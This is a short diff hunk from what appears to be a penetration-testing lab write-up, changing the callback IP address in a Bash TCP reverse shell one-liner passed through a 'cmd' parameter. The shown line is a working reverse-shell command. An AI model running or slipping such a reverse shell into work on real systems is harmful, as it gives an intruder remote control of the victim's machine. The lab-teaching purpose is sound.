@@ -171,7 +171,7 @@ authorized_keys file for a user.
 the cmd parameter. We can use a common Bash TCP reverse shell
 one-liner:
 ```bash
-bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
+bash -i >& /dev/tcp/192.168.45.231/4444 0>&1
 ```
 **
 
